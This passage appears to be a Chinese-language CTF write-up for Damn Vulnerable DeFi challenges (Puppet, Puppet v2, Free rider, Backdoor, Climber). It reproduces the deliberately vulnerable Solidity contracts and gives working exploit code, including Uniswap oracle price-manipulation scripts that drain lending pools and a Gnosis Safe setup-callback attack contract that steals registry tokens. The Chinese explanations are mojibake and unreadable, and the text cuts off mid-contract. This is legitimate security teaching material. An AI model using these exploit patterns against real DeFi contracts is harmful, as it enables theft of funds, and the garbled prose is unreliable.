*/\n\n&#125;\n\nanalyze_computeOraclePrice()å‡½æ•°ä¸­ä¾é çš„æ˜¯å¤–éƒ¨åˆçº¦çš„ä½™é¢è€Œåˆ¶å®šä»·æ ¼ï¼Œåœ¨uniswapPairä¸­å­˜åœ¨10ethä»¥åŠ10dvtã€‚è€Œè¿™ä¸ªæ¯”å€¼ä¹Ÿç›´æŽ¥å½±å“äº†åœ¨è°ƒç”¨borrow()å‡½æ•°æ—¶çš„msg.valueé™åˆ¶ã€‚\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨uniswapPairä¸­å¤§é‡å–å‡ºdvtï¼Œä»Žè€Œä½¿dvtä»·æ ¼æš´è·Œï¼Œåœ¨è§£å‡ºæ‰€æœ‰çš„dvtå³å¯ã€‚\nattackawait this.token.connect(attacker).approve( this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);\n             const tx = await this.uniswapExchange.connect(attacker).tokenToEthSwapOutput(ethers.utils.parseEther('9.9'),\n                 ATTACKER_INITIAL_TOKEN_BALANCE,\n                 (await ethers.provider.getBlock('latest')).timestamp * 2,\n                 &#123; gasLimit: 1e6 &#125;\n             );\n             await tx.wait();\n             const depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);\n             expect(depositRequired &lt; ATTACKER_INITIAL_ETH_BALANCE).to.be.true;\n             await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, &#123;value: depositRequired&#125;)\n\n\n\n9.Puppet v2\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼š\nThe developers of the last lending pool are saying that theyâ€™ve learned the lesson. And just released a new version!\nNow theyâ€™re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.\nYou start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)\ncode// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol\";\nimport \"@uniswap/v2-periphery/contracts/libraries/SafeMath.sol\";\n\ninterface IERC20 &#123;\n    function transfer(address to, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n    function balanceOf(address account) external returns (uint256);\n&#125;\n\n/**\n * @title PuppetV2Pool\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract PuppetV2Pool &#123;\n    using SafeMath for uint256;\n\n    address private _uniswapPair;\n    address private _uniswapFactory;\n    IERC20 private _token;\n    IERC20 private _weth;\n    \n    mapping(address => uint256) public deposits;\n        \n    event Borrowed(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp);\n\n    constructor (\n        address wethAddress,\n        address tokenAddress,\n        address uniswapPairAddress,\n        address uniswapFactoryAddress\n    ) public &#123;\n        _weth = IERC20(wethAddress);\n        _token = IERC20(tokenAddress);\n        _uniswapPair = uniswapPairAddress;\n        _uniswapFactory = uniswapFactoryAddress;\n    &#125;\n\n    /**\n     * @notice Allows borrowing `borrowAmount` of tokens by first depositing three times their value in WETH\n     *         Sender must have approved enough WETH in advance.\n     *         Calculations assume that WETH and borrowed token have same amount of decimals.\n     */\n    function borrow(uint256 borrowAmount) external &#123;\n        require(_token.balanceOf(address(this)) >= borrowAmount, \"Not enough token balance\");\n\n        // Calculate how much WETH the user must deposit\n        uint256 depositOfWETHRequired = calculateDepositOfWETHRequired(borrowAmount);\n        \n        // Take the WETH\n        _weth.transferFrom(msg.sender, address(this), depositOfWETHRequired);\n\n        // internal accounting\n        deposits[msg.sender] += depositOfWETHRequired;\n\n        require(_token.transfer(msg.sender, borrowAmount));\n\n        emit Borrowed(msg.sender, depositOfWETHRequired, borrowAmount, block.timestamp);\n    &#125;\n\n    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) &#123;\n        return _getOracleQuote(tokenAmount).mul(3) / (10 ** 18);\n    &#125;\n\n    // Fetch the price from Uniswap v2 using the official libraries\n    function _getOracleQuote(uint256 amount) private view returns (uint256) &#123;\n        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(\n            _uniswapFactory, address(_weth), address(_token)\n        );\n        return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);\n    &#125;\n&#125;\n\nanalyzeä¸Žä¸Šä¸€é¢˜å‡ ä¹Žç›¸åŒï¼Œä¸è¿‡æ˜¯äº¤æ˜“å¯¹å˜äº†ï¼Œå¹¶ä¸”éœ€è¦å­˜å…¥3å€å€Ÿè´·é‡‘ã€‚\nåœ¨è¿™é“é¢˜ç›®ä¸­çœ‹ä¼¼ä»·æ ¼è®¡ç®—æ–¹å¼å‘ç”Ÿäº†æ”¹å˜ï¼Œä½†æ˜¯å¼•å…¥UniswapV2Library.solå‘çŽ°ï¼Œquote()å‡½æ•°ä¸‹å’Œä¸Šä¸€é¢˜è®¡ç®—æ–¹å¼å¤§åŒå°å¼‚\nfunction quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) &#123;\n        require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');\n        require(reserveA > 0 &amp;&amp; reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        amountB = amountA.mul(reserveB) / reserveA;\n    &#125;\n\næ‰€ä»¥æ”»å‡»æ€è·¯ç›¸åŒï¼Œå¤§é‡å–å‡ºdvtï¼Œä½¿å…¶ä»·æ ¼æš´è·Œï¼Œä¸è¿‡æ­¤æ—¶æ˜¯åœ¨Uniswap v2ä¸­è¿›è¡Œå¹¶ä¸”å°†äº¤æ˜“å¯¹æ”¹å˜ä¸ºwethå’Œtokenï¼Œå†è§£å‡ºå…¨éƒ¨çš„tokenå³å¯ã€‚\nattackconst path = [];\n       path[0] = this.token.address;\n       path[1] = this.weth.address;\n       await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);\n       const timeStamp = (await ethers.provider.getBlock('latest')).timestamp + 1000;\n       const tx = await this.uniswapRouter.connect(attacker).swapExactTokensForETH(\n           ATTACKER_INITIAL_TOKEN_BALANCE, 10000, path, attacker.address, timeStamp,\n           &#123; gasLimit: 1e6 &#125;\n           );\n       await tx.wait();\n       let attackerETHBalance = await ethers.provider.getBalance(attacker.address);\n       let attackerETHBalanceMinusGasCost = attackerETHBalance.sub(ethers.utils.parseEther('0.1'));\n       expect(\n           await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)\n       ).to.be.lt(attackerETHBalanceMinusGasCost);\n       await this.weth.connect(attacker).deposit(&#123; value: attackerETHBalanceMinusGasCost, gasLimit: 1e5&#125;);\n       await this.weth.connect(attacker).approve(this.lendingPool.address, attackerETHBalanceMinusGasCost);\n       const tx2 = await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);\n       await tx2.wait();\n\n\n\n10.Free rider\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼š\nA new marketplace of Damn Valuable NFTs has been released! Thereâ€™s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.\nA buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesnâ€™t know how to do it. So itâ€™s offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.\nYou want to build some rep with this buyer, so youâ€™ve agreed with the plan.\nSadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.\nFreeRiderNFTMarketplace code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"../DamnValuableNFT.sol\";\n\n/**\n * @title FreeRiderNFTMarketplace\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract FreeRiderNFTMarketplace is ReentrancyGuard &#123;\n\n    using Address for address payable;\n\n    DamnValuableNFT public token;\n    uint256 public amountOfOffers;\n\n    // tokenId -> price\n    mapping(uint256 => uint256) private offers;\n\n    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);\n    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);\n    \n    constructor(uint8 amountToMint) payable &#123;\n        require(amountToMint &lt; 256, \"Cannot mint that many tokens\");\n        token = new DamnValuableNFT();\n\n        for(uint8 i = 0; i &lt; amountToMint; i++) &#123;\n            token.safeMint(msg.sender);\n        &#125;        \n    &#125;\n\n    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant &#123;\n        require(tokenIds.length > 0 &amp;&amp; tokenIds.length == prices.length);\n        for (uint256 i = 0; i &lt; tokenIds.length; i++) &#123;\n            _offerOne(tokenIds[i], prices[i]);\n        &#125;\n    &#125;\n\n    function _offerOne(uint256 tokenId, uint256 price) private &#123;\n        require(price > 0, \"Price must be greater than zero\");\n\n        require(\n            msg.sender == token.ownerOf(tokenId),\n            \"Account offering must be the owner\"\n        );\n\n        require(\n            token.getApproved(tokenId) == address(this) ||\n            token.isApprovedForAll(msg.sender, address(this)),\n            \"Account offering must have approved transfer\"\n        );\n\n        offers[tokenId] = price;\n\n        amountOfOffers++;\n\n        emit NFTOffered(msg.sender, tokenId, price);\n    &#125;\n\n    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant &#123;\n        for (uint256 i = 0; i &lt; tokenIds.length; i++) &#123;\n            _buyOne(tokenIds[i]);\n        &#125;\n    &#125;\n\n    function _buyOne(uint256 tokenId) private &#123;       \n        uint256 priceToPay = offers[tokenId];\n        require(priceToPay > 0, \"Token is not being offered\");\n\n        require(msg.value >= priceToPay, \"Amount paid is not enough\");\n\n        amountOfOffers--;\n\n        // transfer from seller to buyer\n        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);\n\n        // pay seller\n        payable(token.ownerOf(tokenId)).sendValue(priceToPay);\n\n        emit NFTBought(msg.sender, tokenId, priceToPay);\n    &#125;    \n\n    receive() external payable &#123;&#125;\n&#125;\n\nanalyzeåœ¨buyone()å‡½æ•°æ¬»å­˜åœ¨æ¼æ´žã€‚\næˆ‘ä»¬è¦å…ˆå®¡è®¡tokenä¸­çš„erc721åˆçº¦ï¼Œè¯¥åˆçº¦ä¸‹æœ‰ä¸€ä¸ªsafeTransferFromæ–¹æ³•ï¼Œè¿›è¡Œå®¡è®¡ã€‚\n function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId\n    ) public virtual override &#123;\n        safeTransferFrom(from, to, tokenId, \"\");\n    &#125;\n\n    /**\n     * @dev See &#123;IERC721-safeTransferFrom&#125;.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory _data\n    ) public virtual override &#123;\n        require(_isApprovedOrOwner(_msgSender(), tokenId), \"ERC721: transfer caller is not owner nor approved\");\n        _safeTransfer(from, to, tokenId, _data);\n    &#125;\n    \n    //è°ƒç”¨äº†_safeTransfer()å‡½æ•°\n      function _safeTransfer(\n        address from,\n        address to,\n        uint256 tokenId,\n        bytes memory _data\n    ) internal virtual &#123;\n        _transfer(from, to, tokenId);\n        require(_checkOnERC721Received(from, to, tokenId, _data), \"ERC721: transfer to non ERC721Receiver implementer\");\n    &#125;\n    \n    //è°ƒç”¨äº†_transfer()å‡½æ•°\n    function _transfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal virtual &#123;\n        require(ERC721.ownerOf(tokenId) == from, \"ERC721: transfer from incorrect owner\");\n        require(to != address(0), \"ERC721: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, tokenId);\n\n        // Clear approvals from the previous owner\n        _approve(address(0), tokenId);\n\n        _balances[from] -= 1;\n        _balances[to] += 1;\n        _owners[tokenId] = to;\n\n        emit Transfer(from, to, tokenId);\n\n        _afterTokenTransfer(from, to, tokenId);\n    &#125;\n\n//åœ¨æ­¤å¤„å¯ä»¥å‘çŽ° _owners[tokenId] = toè¿™å¥ä»£ç ï¼Œè½¬è´¦ä¹‹åŽï¼Œtokençš„æ‹¥æœ‰è€…å‘ç”Ÿæ”¹å˜\n//å‘çŽ°æ¼æ´žï¼Œè¿”å›žåˆå§‹åˆçº¦\n\nç”±äºŽåœ¨è¿›è¡Œäº†buyone()ä¸‹çš„safeTransferFromä¹‹åŽï¼Œtoken.ownerOf(tokenId)å·²ç»å˜æˆè´­ä¹°è€…ï¼Œæ‰€ä»¥ä¸‹ä¸€å¥payable(token.ownerOf(tokenId)).sendValue(priceToPay)ç›¸å½“äºŽå°†åˆšåˆšç”¨æ¥è´­ä¹°nftçš„ethå½’è¿˜ç»™äº†è´­ä¹°è€…ã€‚\nå†buyone()å‡½æ•°ä¸‹è¿˜å­˜åœ¨å¦ä¸€ä¸ªæ¼æ´žï¼Œå› ä¸ºå†buymany()å¤„äº‹å¾ªçŽ¯è°ƒç”¨buyone()å‡½æ•°ï¼Œç„¶è€Œbuyone()å‡½æ•°ä¸­ä½¿ç”¨çš„ require(msg.value &gt;&#x3D; priceToPay)æ‰€ä»¥å¯ä»¥åœ¨ä¸€æ¬¡å¾ªçŽ¯ä¸­ç”¨ä¸€ä»½çš„ä»·æ ¼è´­ä¹°å¤šä¸ªnftã€‚\næ‰€ä»¥ï¼Œå€Ÿ15ä¸ªethï¼Œå¼€ä¹°ï¼\nattack11.Backdoor\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼š\nTo incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.\nTo make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.\nCurrently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.\nYour goal is to take all funds from the registry. In a single transaction.\ncode// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol\";\nimport \"@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol\";\n\n/**\n * @title WalletRegistry\n * @notice A registry for Gnosis Safe wallets.\n           When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.\n * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract WalletRegistry is IProxyCreationCallback, Ownable &#123;\n    \n    uint256 private constant MAX_OWNERS = 1;\n    uint256 private constant MAX_THRESHOLD = 1;\n    uint256 private constant TOKEN_PAYMENT = 10 ether; // 10 * 10 ** 18\n    \n    address public immutable masterCopy;\n    address public immutable walletFactory;\n    IERC20 public immutable token;\n\n    mapping (address => bool) public beneficiaries;\n\n    // owner => wallet\n    mapping (address => address) public wallets;\n\n    constructor(\n        address masterCopyAddress,\n        address walletFactoryAddress, \n        address tokenAddress,\n        address[] memory initialBeneficiaries\n    ) &#123;\n        require(masterCopyAddress != address(0));\n        require(walletFactoryAddress != address(0));\n\n        masterCopy = masterCopyAddress;\n        walletFactory = walletFactoryAddress;\n        token = IERC20(tokenAddress);\n\n        for (uint256 i = 0; i &lt; initialBeneficiaries.length; i++) &#123;\n            addBeneficiary(initialBeneficiaries[i]);\n        &#125;\n    &#125;\n\n    function addBeneficiary(address beneficiary) public onlyOwner &#123;\n        beneficiaries[beneficiary] = true;\n    &#125;\n\n    function _removeBeneficiary(address beneficiary) private &#123;\n        beneficiaries[beneficiary] = false;\n    &#125;\n\n    /**\n     @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback\n             setting the registry's address as the callback.\n     */\n    function proxyCreated(\n        GnosisSafeProxy proxy,\n        address singleton,\n        bytes calldata initializer,\n        uint256\n    ) external override &#123;\n        // Make sure we have enough DVT to pay\n        require(token.balanceOf(address(this)) >= TOKEN_PAYMENT, \"Not enough funds to pay\");\n\n        address payable walletAddress = payable(proxy);\n\n        // Ensure correct factory and master copy\n        require(msg.sender == walletFactory, \"Caller must be factory\");\n        require(singleton == masterCopy, \"Fake mastercopy used\");\n        \n        // Ensure initial calldata was a call to `GnosisSafe::setup`\n        require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, \"Wrong initialization\");\n\n        // Ensure wallet initialization is the expected\n        require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, \"Invalid threshold\");\n        require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, \"Invalid number of owners\");       \n\n        // Ensure the owner is a registered beneficiary\n        address walletOwner = GnosisSafe(walletAddress).getOwners()[0];\n\n        require(beneficiaries[walletOwner], \"Owner is not registered as beneficiary\");\n\n        // Remove owner as beneficiary\n        _removeBeneficiary(walletOwner);\n\n        // Register the wallet under the owner's address\n        wallets[walletOwner] = walletAddress;\n\n        // Pay tokens to the newly created wallet\n        token.transfer(walletAddress, TOKEN_PAYMENT);        \n    &#125;\n&#125;\n\nanalyzeGnosisSafeProxyFactoryåˆçº¦é€šè¿‡deployProxyWithNonceåˆ›å»ºGnosisSafeProxyï¼ŒcreateProxyWithCallbackå‡½æ•°ä¼šè°ƒç”¨createProxyWithNonceå‡½æ•°ï¼Œè€Œä¸”åªè¦æä¾›äº†æœ‰æ•ˆçš„initalizerå°±ä¼šç›´æŽ¥è¿›è¡Œcallè°ƒç”¨ã€‚\næ‰€ä»¥ï¼š\nåˆ›å»ºå¸¦æœ‰approveåŠŸèƒ½çš„æ”»å‡»åˆçº¦ï¼Œabiç¼–ç approveå‡½æ•°ä½œä¸ºsetupå‡½æ•°çš„dataï¼Œabiç¼–ç setupå‡½æ•°ä½œä¸ºcreateProxyWithCallbackä¸‹çš„initializerã€‚\nè¿™æ ·å°±åšåˆ°äº†åˆ›å»ºåˆçº¦æ—¶è¿›è¡Œäº†setupå‡½æ•°è°ƒç”¨ï¼ŒåŒæ—¶å›žè°ƒäº†walletåˆçº¦ä¸‹çš„proxyCreatedå‡½æ•°ï¼Œå®Œæˆè¿™äº›æ—¶ï¼Œtokenå·²ç»è¢«è½¬åˆ°äº†proxyåˆçº¦ä¸‹ï¼Œæ­¤æ—¶å› ä¸ºinitializerçš„åŽŸå› åˆè°ƒç”¨äº†approveå‡½æ•°ï¼Œè¿›è¡Œäº†å°†proxyåˆçº¦çš„tokenæŽˆæƒç»™æ”»å‡»åˆçº¦çš„æ“ä½œï¼Œå†transferfromå³å¯é€šå…³\nattackattackcontract\n\n\ninterface ProxyFactory &#123;\n    function createProxyWithCallback(\n        address _singleton,\n        bytes memory initializer,\n        uint256 saltNonce,\n        IProxyCreationCallback callback\n    ) external returns (GnosisSafeProxy proxy);\n&#125;\ninterface IProxyCreationCallback&#123;&#125;\ninterface GnosisSafeProxy&#123;&#125;\ninterface IERC20&#123;\n    function transferFrom(address,address,uint)external;\n     function approve(address spender, uint token) external;\n&#125;\ncontract attackcontract&#123;\n    address public masterCopyAddress;\n    address public walletRegistryAddress;\n    ProxyFactory proxyFactory;\n    constructor (address _proxyFactoryAddress, address _walletRegistryAddress, address _masterCopyAddress, address _token) &#123;\n        proxyFactory = ProxyFactory(_proxyFactoryAddress);\n        walletRegistryAddress = _walletRegistryAddress;\n        masterCopyAddress = _masterCopyAddress;\n    &#125;\n     function approve(address spender, address token) external &#123;\n        IERC20(token).approve(spender, type(uint256).max);\n    &#125;\n     function attack(address tokenAddress, address hacker, address[] memory victims) public &#123;\n        for (uint256 i = 0; i &lt; victims.length; i++) &#123;\n            address victim = victims[i];\n            address[] memory owners = new address[](1);\n            owners[0] = victim;\n            bytes memory encodedApprove = abi.encodeWithSignature(\"approve(address,address)\", address(this), tokenAddress);\n            bytes memory initializer = abi.encodeWithSignature(\"setup(address[],uint256,address,bytes,address,address,uint256,address)\",\n                owners, 1, address(this), encodedApprove, address(0), 0, 0, 0);\n            GnosisSafeProxy proxy =\n            proxyFactory.createProxyWithCallback(masterCopyAddress, initializer, 0, IProxyCreationCallback(walletRegistryAddress));\n            IERC20(tokenAddress).transferFrom(address(proxy), hacker, 10 ether);\n        &#125;\n    &#125;\n&#125;\n\n\n\n\nthis.attackerContract  = await (await ethers.getContractFactory('attackcontract', attacker)).deploy(\n            this.walletFactory.address,\n            this.walletRegistry.address,\n            this.masterCopy.address,\n            this.token.address\n        );\n\n        await this.attackerContract.connect(attacker).attack(this.token.address, attacker.address, users);\n\n12.Climber\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼š\nThereâ€™s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.\nThe owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.\nOn the vault thereâ€™s an additional role with powers to sweep all tokens in case of an emergency.\nOn the timelock, only an account with a â€œProposerâ€ role can schedule actions that can be executed 1 hour later.\nYour goal is to empty the vault.\nClimberVault code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\nimport \"./ClimberTimelock.sol\";\n\n/**\n * @title ClimberVault\n * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable &#123;\n\n    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;\n    uint256 public constant WAITING_PERIOD = 15 days;\n\n    uint256 private _lastWithdrawalTimestamp;\n    address private _sweeper;\n\n    modifier onlySweeper() &#123;\n        require(msg.sender == _sweeper, \"Caller must be sweeper\");\n        _;\n    &#125;\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer &#123;&#125;\n\n    function initialize(address admin, address proposer, address sweeper) initializer external &#123;\n        // Initialize inheritance chain\n        __Ownable_init();\n        __UUPSUpgradeable_init();\n\n        // Deploy timelock and transfer ownership to it\n        transferOwnership(address(new ClimberTimelock(admin, proposer)));\n\n        _setSweeper(sweeper);\n        _setLastWithdrawal(block.timestamp);\n        _lastWithdrawalTimestamp = block.timestamp;\n    &#125;\n\n    // Allows the owner to send a limited amount of tokens to a recipient every now and then\n    function withdraw(address tokenAddress, address recipient, uint256 amount) external onlyOwner &#123;\n        require(amount &lt;= WITHDRAWAL_LIMIT, \"Withdrawing too much\");\n        require(block.timestamp > _lastWithdrawalTimestamp + WAITING_PERIOD, \"Try later\");\n        \n        _setLastWithdrawal(block.timestamp);\n\n        IERC20 token = IERC20(tokenAddress);\n        require(token.transfer(recipient, amount), \"Transfer failed\");\n    &#125;\n\n    // Allows trusted sweeper account to retrieve any tokens\n    function sweepFunds(address tokenAddress) external onlySweeper &#123;\n        IERC20 token = IERC20(tokenAddress);\n        require(token.transfer(_sweeper, token.balanceOf(address(this))), \"Transfer failed\");\n    &#125;\n\n    function getSweeper() external view returns (address) &#123;\n        return _sweeper;\n    &#125;\n\n    function _setSweeper(address newSweeper) internal &#123;\n        _sweeper = newSweeper;\n    &#125;\n\n    function getLastWithdrawalTimestamp() external view returns (uint256) &#123;\n        return _lastWithdrawalTimestamp;\n    &#125;\n\n    function _setLastWithdrawal(uint256 timestamp) internal &#123;\n        _lastWithdrawalTimestamp = timestamp;\n    &#125;\n\n    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade\n    function _authorizeUpgrade(address newImplementation) internal onlyOwner override &#123;&#125;\n&#125;\n\nClimberTimelock code// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/access/AccessControl.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\n\n/**\n * @title ClimberTimelock\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */\ncontract ClimberTimelock is AccessControl &#123;\n    using Address for address;\n\n    bytes32 public constant ADMIN_ROLE = keccak256(\"ADMIN_ROLE\");\n    bytes32 public constant PROPOSER_ROLE = keccak256(\"PROPOSER_ROLE\");\n\n    // Possible states for an operation in this timelock contract\n    enum OperationState &#123;\n        Unknown,\n        Scheduled,\n        ReadyForExecution,\n        Executed\n    &#125;\n\n    // Operation data tracked in this contract\n    struct Operation &#123;\n        uint64 readyAtTimestamp;   // timestamp at which the operation will be ready for execution\n        bool known;         // whether the operation is registered in the timelock\n        bool executed;      // whether the operation has been executed\n    &#125;\n\n    // Operations are tracked by their bytes32 identifier\n    mapping(bytes32 => Operation) public operations;\n\n    uint64 public delay = 1 hours;\n\n    constructor(\n        address admin,\n        address proposer\n    ) &#123;\n        _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);\n        _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);\n\n        // deployer + self administration\n        _setupRole(ADMIN_ROLE, admin);\n        _setupRole(ADMIN_ROLE, address(this));\n\n        _setupRole(PROPOSER_ROLE, proposer);\n    &#125;\n\n    function getOperationState(bytes32 id) public view returns (OperationState) &#123;\n        Operation memory op = operations[id];\n        \n        if(op.executed) &#123;\n            return OperationState.Executed;\n        &#125; else if(op.readyAtTimestamp >= block.timestamp) &#123;\n            return OperationState.ReadyForExecution;\n        &#125; else if(op.readyAtTimestamp > 0) &#123;\n            return OperationState.Scheduled;\n        &#125; else &#123;\n            return OperationState.Unknown;\n        &#125;\n    &#125;\n\n    function getOperationId(\n        address[] calldata targets,\n        uint256[] calldata values,\n        bytes[] calldata dataElements,\n        bytes32 salt\n    ) public pure returns (bytes32) &#123;\n        return keccak256(abi.encode(targets, values, dataElements, salt));\n    &#125;\n\n    function schedule(\n        address[] calldata targets,\n        uint256[] calldata values,\n        bytes[] calldata dataElements,\n        bytes32 salt\n    ) external onlyRole(PROPOSER_ROLE) &#123;\n        require(targets.length > 0 &amp;&amp; targets.length &lt; 256);\n        require(targets.length == values.length);\n        require(targets.length == dataElements.length);\n\n        bytes32 id = getOperationId(targets, values, dataElements, salt);\n        require(getOperationState(id) == OperationState.Unknown, \"Operation already known\");\n        \n        operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;\n        operations[id].known = true;\n    &#125;\n\n    /** Anyone can execute what has been scheduled via `schedule` */\n    function execute(\n        address[] calldata targets,\n        uint256[] calldata values,\n        bytes[] calldata dataElements,\n        bytes32 salt\n    ) external payable &#123;\n        require(targets.length > 0, \"Must provide at least one target\");\n        require(targets.length == values.length);\n        require(targets.length == dataElements.length);\n\n        bytes32 id = getOperationId(targets, values, dataElements, salt);\n\n        for (uint8 i = 0; i &lt; targets.length; i++) &#123;\n            targets[i].functionCallWithValue(dataElements[i], values[i]);\n        &#125;\n        \n        require(getOperationState(id) == OperationState.ReadyForExecution);\n        operations[id].executed = true;\n    &#125;\n\n    function updateDelay(uint64 newDelay) external &#123;\n        require(msg.sender == address(this), \"Caller must be timelock itself\");\n        require(newDelay &lt;= 14 days, \"Delay must be 14 days or less\");\n        delay = newDelay;\n    &#125;\n\n    receive() external payable &#123;&#125;\n&#125;\n\nanalyzeé—®é¢˜1ï¼šåªæœ‰sweepFunds(0å‡½æ•°å¯ä»¥ä¸€æ¬¡æ€§å–èµ°å…¨éƒ¨çš„tokenï¼Œä½†æ˜¯è¯¥å‡½æ•°è¢«é™åˆ¶ä¸ºonlySweeperï¼Œæ˜¾ç„¶è¿™é‡Œä¸å¯è¡Œï¼Œä½†æ˜¯åˆçº¦å¯ä»¥å‡çº§ï¼Œæˆ‘ä»¬å¯ä»¥å‡çº§åˆçº¦åŽ»é™¤onlySweeperé™åˆ¶\né—®é¢˜2ï¼šåˆ†æžClimberTimelockåˆçº¦ä¸‹çš„execute()å‡½æ•°ï¼Œå‘çŽ°å‡½æ•°çš„æ‰§è¡Œé€»è¾‘å­˜åœ¨é—®é¢˜ï¼Œå…ˆæ‰§è¡Œå†åˆ¤æ–­é™åˆ¶æ¡ä»¶ï¼Œæ‰€ä»¥ä¼šäº§ç”Ÿæ¼æ´žï¼Œå¯ä»¥åœ¨execute()å‡½æ•°ä¸‹çš„callå¤„è°ƒç”¨schedule()å‡½æ•°ä½¿å¾—execute()å‡½æ•°çš„æœ€åŽä¸€æ¡requireæ¡ä»¶æ»¡è¶³ï¼Œä½†æ˜¯å‘çŽ°è¿™è¡Œä¸é€šï¼Œå› ä¸ºè°ƒç”¨å‡½æ•°æ—¶è¿›è¡Œäº†roleæ£€æµ‹ï¼Œæ˜¾ç„¶æˆ‘ä»¬æ²¡æœ‰roleï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥grantRoleè¿›è¡Œsetï¼Œä¸ºæ”»å‡»åˆçº¦setroleï¼Œç„¶åŽåœ¨æ”»å‡»åˆçº¦ä¸‹è°ƒç”¨schedule()å‡½æ•°ã€‚\nåˆ†æžåˆ°è¿™é‡Œè¿™é“é¢˜åŸºæœ¬å°±å·²ç»è§£å†³äº†ï¼Œå‰©ä¸‹å°±æ˜¯ç¼–å†™æ”»å‡»åˆçº¦ä»¥åŠç¼–å†™æ›´æ–°åˆçº¦çš„é—®é¢˜äº†\nattackattackcontract\n\ninterface ClimberVault1&#123;&#125;\ninterface ClimberTimelock1&#123;\n    function execute(address[] calldata targets,uint256[] calldata values,bytes[] calldata dataElements,bytes32 salt) external payable;\n    function schedule(address[] calldata targets,uint256[] calldata 